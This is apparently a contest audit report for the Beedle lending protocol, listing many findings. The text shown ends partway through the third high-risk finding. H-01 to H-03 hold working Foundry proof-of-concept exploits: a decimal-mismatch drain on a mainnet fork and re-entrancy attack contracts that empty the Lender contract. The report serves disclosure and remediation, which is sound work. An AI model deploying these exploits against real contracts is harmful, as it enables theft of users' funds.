# Beedle - Oracle free perpetual lending - Findings Report

# Table of contents
- ### [Contest Summary](#contest-summary)
- ### [Results Summary](#results-summary)
- ## High Risk Findings
    - [H-01. Tokens with less than 18 decimals allow for draining of funds](#H-01)
    - [H-02. Lender contract can be drained by re-entrancy in `repay`](#H-02)
    - [H-03. Lender contract can be drained by re-entrancy in `setPool`](#H-03)
    - [H-04. Sandwich attack to steal all ERC-20 tokens in the Fees contract](#H-04)
    - [H-05. Borrower can use Refinance to cancel auctions so they can extend their loan indefinitely](#H-05)
    - [H-06. During refinance() new Pool balance debt is subtracted twice](#H-06)
    - [H-07. Borrower can bypass maxLoanRatio's configuration of a pool via buyLoan()](#H-07)
    - [H-08. [H-04] Lender#buyLoan - Malicious user could take over a loan for free without having a pool because of wrong access control](#H-08)
    - [H-09. Using forged/fake lending pools to steal any loan opening for auction](#H-09)
    - [H-10. Stealing any loan opening for auction through others' lending pool](#H-10)
    - [H-11. Attacker can steal a loan's collateral and break the protocol](#H-11)
    - [H-12. Fee on transfer tokens will cause users to lose funds](#H-12)
    - [H-13. update() not getting called right after a WETH amount has been sent will cause users to lose staking rewards](#H-13)
    - [H-14. Sandwich attack to steal all ERC-20 tokens in the Fees contract](#H-14)
    - [H-15. Token spending by Uniswap router doesn't get approved](#H-15)
    - [H-16. Front-runnig the first deposit on stake yealds the whole WETH amount](#H-16)
    - [H-17. Rewards can be sabotaged by large deposit and withdraw](#H-17)
    - [H-18. Borrower can prevent his/her loan from being liquidated](#H-18)
    - [H-19. A pool lender can fully drain another user's pool by abusing `buyLoan`](#H-19)
    - [H-20. `Lender` does not handle correctly rebasing, inflationary, deflationary tokens and tokens with fee on transfer](#H-20)
    - [H-21. Forcing a borrower to pay a huge debt via the giveLoan()](#H-21)
    - [H-22. Hardcoded Router Address May Cause Token Lockup in Non-Standard Networks](#H-22)
    - [H-23. Lender can Sandwich a borrower to seize his collateral](#H-23)
    - [H-24. WETH staking rewards accumulated before the first staker deposits remain unutilized and stuck in the `Staking` contract](#H-24)
    - [H-25. WETH token balance is incorrectly updated when claiming staking rewards resulting in stuck WETH rewards](#H-25)
    - [H-26. The `borrow` and `refinance` functions can be front-run by the pool lender leading to collateral being seized in the next block](#H-26)
- ## Medium Risk Findings
    - [M-01. Precision loss allows users to giveLoans to pools with less collateral then required](#M-01)
    - [M-02. The `borrow` and `refinance` functions can be front-run by the pool lender to set high interest rates](#M-02)
    - [M-03. If a borrower or lender got blacklisted by asset contract, their collateral or loan funds can be permanently frozen with the pool ](#M-03)
    - [M-04. No expiration deadline leads to losing a lot of funds](#M-04)
    - [M-05. Malicious lender can increment the loan interest using the auction process](#M-05)
    - [M-06. Single-step process for critical ownership transfer is risky](#M-06)
    - [M-07. Lender contract can be drained by re-entrancy in `seizeLoan`](#M-07)
    - [M-08. Fixed fee level is used when swap tokens on Uniswap](#M-08)
    - [M-09. Pragma non-specification can lead to non-functional / corrupted contract when deployed on Arbitrum](#M-09)
    - [M-10. Frontrun can get the full reward, no staking time required](#M-10)
    - [M-11. Lender contract can be drained by re-entrancy in `refinance` (collateral)](#M-11)
    - [M-12. Some ERC20 tokens would revert on zero value fee transfers.](#M-12)
    - [M-13. Rounding error leads to borrowing loans without paying interest](#M-13)
    - [M-14. Setting borrower fees to 0 permits the borrow functionality to be completely DoS](#M-14)
    - [M-15. The lack of a WETH-Profits Token pair upon calling sellProfits can expose it to malicious pool creation](#M-15)
- ## Low Risk Findings
    - [L-01. Zero address leads to transaction reverts](#L-01)
    - [L-02. Lender fails to giveLoan because of inconsistent length between `loadIds` and `poolIds`](#L-02)
    - [L-03. Missing Events Emitting](#L-03)
    - [L-04. Wrong Amount of Loan Interest is Calculated](#L-04)
    - [L-05. Amount != 0 checks are missing](#L-05)
    - [L-06. Possible incorrect borrowing timestamps ](#L-06)
    - [L-07. Griefing a lender with dust loans](#L-07)
    - [L-08. Staking contracts should be assert TKN != WETH](#L-08)
    - [L-09. Operator can prevent customers from borrowing from a given pool](#L-09)
    - [L-10. Loan can be seized during an auction](#L-10)
    - [L-11. Permanent staking reward dilution](#L-11)
    - [L-12. Emitting incorrect event parameters](#L-12)
    - [L-13. Rounding error risk in borrow() function in Lender.sol](#L-13)
    - [L-14. Staking tokens transfer to the staking contract will make a fraction of WETH rewards be lost forever](#L-14)
    - [L-15. Loss of precision in `Staking.updateFor()` will make user to lose claimable amount.](#L-15)
    - [L-16. Event Based Reentrancy due to CallBack Tokens  ](#L-16)
    - [L-17. Pausable Tokens ](#L-17)
    - [L-18. User can DoS pool lender's withdrawals.](#L-18)
    - [L-19. Possible DOS by borrowers in `setPool()`](#L-19)
    - [L-20. Refinancing in the same pool requires it to have a higher balance than needed because of a flawed check](#L-20)
    - [L-21. Interest calculation error if L2 sequencer go down ](#L-21)
    - [L-22. Inability to refinance within the same pool due to exceeding the pool balance](#L-22)
    - [L-23. Buying a loan always reverts at the start of an auction](#L-23)
    - [L-24. LoanId-ındex may lost cause of gas grief](#L-24)
    - [L-25. [H-01] Fees collected can be sent to any address](#L-25)
    - [L-26. Griefing Attack via updateFor Function](#L-26)
    - [L-27. Lenders could receive interest less than expected](#L-27)
    - [L-28. Critical Reentrancy Vulnerability Enabling Sequential Pool Updates and Total Fund Withdrawal](#L-28)
- ## Gas Optimizations / Informationals
    - [G-01. `Staked` struct is created but never used](#G-01)
    - [G-02. Move the Duplicate Checks into a Modifier](#G-02)
    - [G-03. User can steal reward tokens if the Staking contract uses tokens with different decimals](#G-03)
    - [G-04. Inconsistent formatting across all the contracts](#G-04)
    - [G-05. Cannot use `_burn` Function in Beedle.sol Contract](#G-05)
    - [G-06. Save gas for collecting protocol fees and interests](#G-06)
    - [G-07. Multiple accesses of a mapping/array should use a local variable cache.](#G-07)
    - [G-08. Modifier gas optimization for onlyOwner modifier](#G-08)
    - [G-09. Replace OZ ERC20 with solady ERC20](#G-09)
    - [G-10. += and -= are more expensive ](#G-10)
    - [G-11. The `for loops` inside the borrow(), repay(), giveLoan() & startAuction() functions in Lender contract are probably gas-guzzlers](#G-11)
    - [G-12. Uncheck Arithmetic where overflow/underflow impossible ](#G-12)
    - [G-13. Using Private Rather Than Public For Constants,Saves Gas](#G-13)
    - [G-14. Use `!= 0` rather than `> 0`](#G-14)
    - [G-15. Use of magic numbers](#G-15)
    - [G-16. Named parameter mappings ](#G-16)
    - [G-17. Unnecessary If condition in update() of Staking.sol](#G-17)
    - [G-18. For the borrow(), repay() & startAuction() functions in Lender.sol the public visibility modifiers should be changed to external, to help optimize gas usage](#G-18)
    - [G-19. Use assembly to check for `address(0)`](#G-19)
    - [G-20. caching variable of struct in one slot ](#G-20)
    - [G-21. save storage slot ](#G-21)
    - [G-22. an important value does not been returned](#G-22)
    - [G-23. Use better name in sellProfits function](#G-23)
    - [G-24. [L-07] interface Staking.FeeDistribution is not used](#G-24)
    - [G-25. Gas1-CompilerFlag-CarlosAlegreUr](#G-25)
    - [G-26. QA2-Refactor-CarlosAlegreUr](#G-26)
    - [G-27. Wrong comment in `setPool` function](#G-27)
    - [G-28. NatSpec documentation for function is missing](#G-28)
    - [G-29. Medium4-StorageOccupation-CarlosAlegreUr](#G-29)
    - [G-30. Don't use draft versions in production](#G-30)
    - [G-31. `setPool()` should check if `p.minLoanSize` < p.poolBalance](#G-31)
    - [G-32. Large multiples of ten should use scientific notation](#G-32)
    - [G-33. Constants in comparisons should appear on the left side](#G-33)
    - [G-34. Floating pragma in all contracts](#G-34)
    - [G-35. Conformance to Solidity naming conventions](#G-35)
    - [G-36. [L-06] Some imported libraries are not used](#G-36)
    - [G-37. No use of Ownable in Staking contract.](#G-37)
    - [G-38. Use assembly to perform hashing instead of Solidity to reduce gas costs.](#G-38)
    - [G-39. Strict comparisons are more expensive than non-strict ones](#G-39)
    - [G-40. Lack of pause pool function in Lender contract](#G-40)
    - [G-41. Should check mapping key exists before using](#G-41)
    - [G-42. Use if + custom errors instead of using require + string](#G-42)
    - [G-43. Don't initialize `uint/int` variables with default value](#G-43)
    - [G-44. Mixed usage of `int`/`uint` with `int256`/`uint256`](#G-44)
    - [G-45. Multiple `address` mappings can be combined into a single mapping of an `address` to a `struct`, where appropriate](#G-45)
    - [G-46. Using `x >> constant(uint)` with the right shift operator is a more gas-efficient](#G-46)
    - [G-47. CEI pattern not followed in multiple functions in Staking.sol](#G-47)
    - [G-48. [G-01] - Do not add the data which is alreday included in the tx to save users gas cost.](#G-48)
    - [G-49. Cache array length outside of loop](#G-49)
    - [G-50. Incorrect Event Emmiting](#G-50)
    - [G-51. Unbounded loop in Lender.sol functions may revert. ](#G-51)
    - [G-52. Misspelled event in `Lender.sol`](#G-52)
    - [G-53. Lender.sol: The error being `PoolConfig` in most cases is completely a downside of protocol as users can't know the reasons to why their transaction failed](#G-53)
    - [G-54. Setter functions not checking if value changed ](#G-54)
    - [G-55. Function ordering does not follow the Solidity style guide](#G-55)
    - [G-56. abi.encode(..) is less efficient ](#G-56)
    - [G-57. ensure loan exist before calculate the loandebt](#G-57)
    - [G-58. Checks can be used without or operator for gas save](#G-58)
    - [G-59. Typo in README "potisitions"](#G-59)
    - [G-60. `PoolBalanceUpdated` event is emitted even when pool balance is not changed.](#G-60)
    - [G-61. Initialize variables outside the loop](#G-61)
    - [G-62. Borrower can put up a loan which is immediately "insolvent" which can immediately be auctioned off.](#G-62)
    - [G-63. All interfaces must be in one folder](#G-63)
    - [G-64. Underscore function arguments ](#G-64)
    - [G-65. Solidity Optimizor](#G-65)
    - [G-66. Custom Errors naming ](#G-66)
    - [G-67. Incorrect comments ](#G-67)
    - [G-68. The owner of the protocol can frontrun the `setLenderFee` if some borrower borrows a big amount of tokens](#G-68)
    - [G-69. Compromised / Malicious owner of `Lender.sol` can favour old pool by transfering all loans to new pool when `buyLoan` called and receive excess rewards.](#G-69)
    - [G-70. Repeated code](#G-70)
    - [G-71. Cache IERC20(address)](#G-71)
    - [G-72. Unwanted gas expenditure by recomputing already computed value](#G-72)
    - [G-73. Refactor checks involving constants first followed by that include state variables to save gas.](#G-73)
    - [G-74. Use predefined address instead of `address(this)`](#G-74)
    - [G-75. [I-02] - Unnecessary Inheritance.](#G-75)
    - [G-76. Use named imports instead of plain `import file.sol](#G-76)
    - [G-77. Spelling mistake in Lender::seizeLoan](#G-77)
    - [G-78. Spelling/Errors Organization](#G-78)
    - [G-79. Function Name Optimization](#G-79)
    - [G-80. Positions is misspelled in the readme](#G-80)
    - [G-81. Test Coverage Improvements](#G-81)
    - [G-82. Error in comment](#G-82)
    - [G-83. Use unchecked for collateral](#G-83)
    - [G-84. Borrower cannot partially repay interest of a loan](#G-84)
    - [G-85. improved/corrected comment: "a dynamic array of structs representing all desired debt positions to be refinanced."](#G-85)
    - [G-86. Using delete statement can save gas](#G-86)
    - [G-87. Use `assembly` to write address storage values](#G-87)
    - [G-88. Use indexed events for value types as they are less costly compared to non-indexed ones](#G-88)
    - [G-89. Events are missing sender information](#G-89)
    - [G-90. Unnecessery function in the Beedle.sol contract](#G-90)
    - [G-91. Use smaller data types for `lenderFee` and `borrowerFee` for better storage packing](#G-91)
    - [G-92. `_calculateInterest()` in `Lender.sol` can be refactored to save gas](#G-92)
    - [G-93. Long functions should be refactored into multiple, smaller, functions](#G-93)
    - [G-94. Interfaces should be indicated with an `I` prefix in the contract name](#G-94)
    - [G-95. Use assembly to emit an event](#G-95)
    - [G-96. Use do while loops instead of for loops.](#G-96)
    - [G-97. Caching the pool variable for gas savings](#G-97)
    - [G-98. [G-01] The owner can be declared inside the constructor](#G-98)
    - [G-99. [L-02] Unnecessary abstract statement](#G-99)
    - [G-100. [L-03] The OwnershipTransferred event should send the oldOwner](#G-100)
    - [G-101. MaxLoanRatio is not configured properly.](#G-101)
    - [G-102. ADD UNCHECKED{} FOR SUBTRACTIONS WHERE THE OPERANDS CANNOT UNDERFLOW BECAUSE OF A PREVIOUS IF-STATEMENT](#G-102)
    - [G-103. Incorrect Fee Calculation in Seize Function](#G-103)
    - [G-104. Lack of updating the auctionLength parameter in the giveLoan() and buyLoan()](#G-104)
    - [G-105. Fuzz setup incorrectly mints loanTokens to borrower](#G-105)
    - [G-106. Use safe mint rather than mint](#G-106)
    - [G-107. maxLoanRatio calculation differs from commentary](#G-107)
    - [G-108. Absence of Event Logs in `Staking.sol` Reduces Contract Transparency and Auditability](#G-108)
    - [G-109. Sender in `transferFrom` in `Lender.setPool` different from msg.sender](#G-109)
    - [G-110. New lender is charged with paying protocolInterest](#G-110)

# <a id='contest-summary'></a>Contest Summary

### Sponsor: BeedleFi

### Dates: Jul 24th, 2023 - Aug 7th, 2023

[See more contest details here](https://codehawks.cyfrin.io/c/2023-07-beedle)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 26
   - Medium: 15
   - Low: 28
  - Gas/Info: 110

# High Risk Findings

## <a id='H-01'></a>H-01. Tokens with less than 18 decimals allow for draining of funds

_Submitted by [nmirchev8](https://profiles.cyfrin.io/u/undefined), [degensec](https://profiles.cyfrin.io/u/undefined), [credence0x](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [0xumarkhatab](https://profiles.cyfrin.io/u/undefined), [inallhonesty](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [Niki](https://profiles.cyfrin.io/u/undefined), [daniel526](https://profiles.cyfrin.io/u/undefined), [peanuts](https://profiles.cyfrin.io/u/undefined), [kral01](https://profiles.cyfrin.io/u/undefined), [0xCiphky](https://profiles.cyfrin.io/u/undefined), [tofunmi](https://profiles.cyfrin.io/u/undefined), [polaris_tow](https://profiles.cyfrin.io/u/undefined), [deadrosesxyz](https://profiles.cyfrin.io/u/undefined), [vangrim](https://profiles.cyfrin.io/u/undefined), [BanditSecurity](https://profiles.cyfrin.io/u/undefined), [Avci](https://profiles.cyfrin.io/u/undefined), [No12Samurai](https://profiles.cyfrin.io/u/undefined), [ubermensch](https://profiles.cyfrin.io/u/undefined), [0xyPhilic](https://profiles.cyfrin.io/u/undefined), [gkrastenov](https://profiles.cyfrin.io/u/undefined), [hasanza](https://profiles.cyfrin.io/u/undefined), [SA110](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [honeymewn](https://profiles.cyfrin.io/u/undefined), [kose](https://profiles.cyfrin.io/u/undefined), [hlx](https://profiles.cyfrin.io/u/undefined), [KrisApostolov](https://profiles.cyfrin.io/u/undefined). Selected submission by: [0xyPhilic](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol#L246

## Summary

The `Lender.sol` contract allows users to supply assets which can then be borrowed by providing collateral by other users in a peer-to-peer fashion. As the lending market is open anyone can create a pool with any two assets - loanToken and collateralToken. Whenever a user decides to borrow the loanToken he needs to provide a sufficient amount of collateralToken so that the final ratio of the loan is below a pre-set maxLoanRatio. Essentially the idea is to allow users to borrow from other users with sufficient overcollateralization on their loan in a way that if the loan is defaulted the lender would receive the collateral and not lose funds.

## Vulnerability Details

However the protocol does not take into account tokens with 18 decimals and assumes that all tokens added on a pool creation i.e. both loanToken and collateralToken have 18 decimal spots. This is not the case for many major tokens which can be expected to be either added as collateral or as a loan tokens like WBTC (8 decimals), USDC (6 decimals) etc. This lack of accountability allows an attacker to drain the funds supplied by the user who set the pool with a minimum investment. The following PoC shows how this can be done by using USDC/WETH as a pool pair where USDC is the loanToken and WETH is the collateral - quite major and widely used combination:

A few notes:
1. The PoC uses a fork of Ethereum Mainnet
2. The maxLoan is set to 2*10**18 which is taken from the official `Lender.t.sol` test in the repo

```solidity

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Lender.sol";

import {ERC20} from "solady/src/tokens/ERC20.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";
import {WETH} from "solady/src/tokens/WETH.sol";


contract LenderNewTest is Test {

    Lender public _lender;
    IERC20 public _usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    WETH public _weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    address bob = vm.addr(0x01);
    address attacker = vm.addr(0x02);

    address _donator = 0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503;

    function setUp() public {
        _lender = new Lender();
    }


    function test_calculationExploit() external {
        vm.startPrank(_donator);
        _usdc.transfer(bob, 5000e6);
        _usdc.transfer(attacker, 5000e6);
        vm.stopPrank();
        vm.deal(bob, 5e18);
        vm.deal(attacker, 5e18);
        vm.startPrank(bob);
        _weth.deposit{value: 5e18}();
        Pool memory p = Pool({
            lender: bob,
            loanToken: address(_usdc),
            collateralToken: address(_weth),
            minLoanSize: 100e6,
            poolBalance: 5000e6,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        _usdc.approve(address(_lender), type(uint256).max);
        _lender.setPool(p);
        vm.stopPrank();
        vm.startPrank(attacker);
        _weth.deposit{value: 5e18}();
        bytes32 poolId = _lender.getPoolId(bob, address(_usdc), address(_weth));
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 5000e6,
            collateral: 1e10 // collateral is WETH --> 0.00000001 --> 0.000018$ to borrow 5k USDC
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;
        _weth.approve(address(_lender), type(uint256).max);
        _lender.borrow(borrows);
        vm.stopPrank();
        console.log("USDC Balance Attacker: ", _usdc.balanceOf(attacker));
        console.log("WETH Balance Attacker: ", _weth.balanceOf(attacker));
    }

}

```

The test can be ran with the following command:

```cmd
forge test --match-contract LenderNewTest --fork-url [infura_rpc] -vv
```

The test completes successfully showing how on a pool created by a regular user with 5000 USDC initial loanToken deposit and WETH as collateral, an attacker could borrow all the 5000 USDC with just 0.00000001 WETH (roughly 0.000018$ at todays prices).

## Impact

Any pools which have a loan token with less than 18 decimals can be drained with almost insignificant collateral provided. 

**Note**: This issue is bi-directional as a pair where the loanToken has 18 decimals and the collateralToken has less than 18 decimals also breaks the core logic of the protocol by producing an extremely high `loanRatio` essentially blocking any transaction as the check `if (loanRatio > pool.maxLoanRatio) revert RatioTooHigh();` would almost every time cause a revert.

## Tools Used

Manual Review / Foundry

## Recommendations

Make sure to scale debt and collateral based on the token decimals in order to calculate properly the `loanRatio`. This can be easily done by changing the loanRatio calculation as follows:

```solidity
uint256 loanRatio = ((debt * (10**(18 - loanToken.decimals()))) * 10 ** 18) / (collateral * (10 ** (18 - collateralToken.decimals())));
```
## <a id='H-02'></a>H-02. Lender contract can be drained by re-entrancy in `repay`

_Submitted by [mahdirostami](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [StErMi](https://profiles.cyfrin.io/u/undefined), [Niki](https://profiles.cyfrin.io/u/undefined), [bernd](https://profiles.cyfrin.io/u/undefined), [0xDetermination](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [HALITUS](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [Mlome](https://profiles.cyfrin.io/u/undefined), [ak1](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Mlome](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317

## Summary
An attacker can craft a token allowing reentrant calls on transfer to drain any token from the `Lender` contract.

## Vulnerability Details
The `Lender` contract allows any token as `loanToken` and the `repay` function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability. A malicious actor can craft a token allowing reentrant calls on transfer to exploit the re-entrancy vulnerability in the `repay` function and get more than one time his collateral back.

```solidity
File: Lender.Sol

L316:	// transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
            delete loans[loanId];
        }
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317


## Impact
All tokens can be drained from the contract. This is a critical vulnerability.
### POC
An attacker can use the following exploit contracts to drain the `lender` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ExploitToken is ERC20 {
    address owner;
    constructor(uint256 amount) ERC20("ExploitToken", "ET") {
        owner = msg.sender;
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
}
```

```solidity
File: Exploit7.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ExploitToken} from "./ExploitToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit7  {
    Lender lender;
    address collateralToken;
    ExploitToken exploitToken;
    bool loanBorrowed;
    uint256 i;

    constructor(Lender _lender, address _collateralToken) {
        lender = _lender;
        collateralToken = _collateralToken;
    }

    function attack(address _collateralToken) external {
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        // (1) Mint exploitToken
        exploitToken = new ExploitToken(1_000_000_000*10*18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);
        // (2) Create a pool of exploitTokens
         Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1_000_000*10*18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(pool);
        // (3) Take a loan of exploitTokens
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (4) Take another loan of exploitTokens to increase poolBalance
        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });
        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;
        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 /*amount*/) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the `repay` function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000*10**18);
	collateralToken.transfer(address(attacker), 1_000*10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10_000*10**18);  // Lender contract has 10_000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1_000*10**18 + 1); // Attacker has 1_000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000*10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11_000*10**18); // Attacker has stolen all the 10_000 collateralToken
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by deleting the loan `loans[loanId]` before transfering the funds AND use nonReentrant modifiers
## <a id='H-03'></a>H-03. Lender contract can be drained by re-entrancy in `setPool`

_Submitted by [mahdirostami](https://profiles.cyfrin.io/u/undefined), [cosine](https://profiles.cyfrin.io/u/undefined), [charlescheerful](https://profiles.cyfrin.io/u/undefined), [pyro](https://profiles.cyfrin.io/u/undefined), [jprod15](https://profiles.cyfrin.io/u/undefined), [RugpullDetector](https://profiles.cyfrin.io/u/undefined), [darksnow](https://profiles.cyfrin.io/u/undefined), [sonny2k](https://profiles.cyfrin.io/u/undefined), [JrNet](https://profiles.cyfrin.io/u/undefined), [trtrth](https://profiles.cyfrin.io/u/undefined), [pep7siup](https://profiles.cyfrin.io/u/undefined), [lalanda](https://profiles.cyfrin.io/u/undefined), [0xscsamurai](https://profiles.cyfrin.io/u/undefined), [sobieski](https://profiles.cyfrin.io/u/undefined), [Mlome](https://profiles.cyfrin.io/u/undefined), [0xsmartcontract](https://profiles.cyfrin.io/u/undefined), [honeymewn](https://profiles.cyfrin.io/u/undefined), [SBSecurity](https://codehawks.cyfrin.io/team/clkuz8xt7001vl608nphmevro), [VaRuN](https://profiles.cyfrin.io/u/undefined), [fondevs](https://profiles.cyfrin.io/u/undefined). Selected submission by: [Mlome](https://profiles.cyfrin.io/u/undefined)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159

## Summary
Tokens allowing reentrant calls on transfer can be drained from the contract.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `setPool` function. When the new `p.poolBalance` is less than the `currentBalance`, the difference is sent to the borrower before updating the state.
```solidity
File: Lender.sol

L157:	} else if (p.poolBalance < currentBalance) {
            // if new balance < current balance then transfer the difference back to the lender
            IERC20(p.loanToken).transfer( // @audit - Critical Re-entrancy can drain contract
                p.lender,
                currentBalance - p.poolBalance
            );
        }
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159


## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit3.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit3  {
    Lender lender;
    Pool pool;

    constructor(Lender _lender) {
        lender = _lender;
    }

    function attack(address _loanToken, uint256 _poolBalance) external {
        ERC20(_loanToken).approve(address(lender), _poolBalance);
        // [1] Create a new pool
        Pool memory p = Pool({
            lender: address(this),
            loanToken: _loanToken,
            collateralToken: address(0),
            minLoanSize: 10*10**18,
            poolBalance: _poolBalance,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);
        // [2] Update pool with 0 poolBalance
        p.poolBalance = 0;
        pool = p;
        lender.setPool(p);
        // [3] Send the funds back to the attacker
        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 amount) external {
        Pool memory p = pool;
        require(msg.sender == p.loanToken, "not collateral token");
        if (from == address(lender)) {
            uint256 lenderBalance = ERC20(p.loanToken).balanceOf(address(lender));
            if (lenderBalance > 0) {
                // Re-enter
                if (lenderBalance < amount) {
                    p.poolBalance = amount - lenderBalance;
                }
                lender.setPool(p);
            }          
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
	// Setup
	address attacker = address(0x5); 
	WeirdToken weirdToken = new WeirdToken(10_500*10**18); 
	weirdToken.transfer(address(lender), 9_500*10**18);
	weirdToken.transfer(address(attacker), 1_000*10**18);

	// Before the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 9_500*10**18);      // Lender contract has 9_500 weirdToken
	assertEq(weirdToken.balanceOf(address(attacker)), 1_000*10**18);    // Attacker has 1_000 weirdToken

	// Exploit starts here
	vm.startPrank(attacker);
	Exploit3 attackContract = new Exploit3(lender);
	weirdToken.transfer(address(attackContract), 1_000*10**18);
	attackContract.attack(address(weirdToken), 1_000*10**18);

	// After the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 0);                 // Lender contract has been drained
	assertEq(weirdToken.balanceOf(address(attacker)), 10_500*10**18);   // Attacker stole all the tokens
}
```

